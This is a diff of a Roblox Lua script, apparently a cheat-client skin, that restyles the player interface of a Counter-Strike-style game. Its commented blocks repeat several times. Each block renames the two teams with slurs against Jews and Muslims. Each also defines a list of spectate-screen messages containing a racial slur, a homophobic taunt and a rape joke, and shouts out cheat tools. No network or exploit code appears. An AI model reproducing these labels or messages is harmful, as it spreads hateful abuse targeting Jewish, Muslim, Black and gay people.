+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
